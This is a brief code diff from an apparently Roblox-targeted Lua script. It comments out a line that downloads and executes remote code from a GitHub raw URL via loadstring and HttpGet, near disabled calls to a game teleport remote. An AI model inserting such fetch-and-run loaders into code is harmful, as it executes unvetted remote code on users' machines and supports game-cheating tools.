@@ -31,7 +31,7 @@ local _Config_Offline = getOffline()
 	--ReplicatedStorage = game:GetService("ReplicatedStorage")
 	--ReplicatedStorage:WaitForChild("Network"):WaitForChild("World1Teleport"):InvokeServer()	
 	--end
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/vingagagagagaga2/GAGAGAGA000999xz/refs/heads/main/103sendluckyegg"))()	
+	--loadstring(game:HttpGet("https://raw.githubusercontent.com/vingagagagagaga2/GAGAGAGA000999xz/refs/heads/main/103sendluckyegg"))()	
 
  end
 
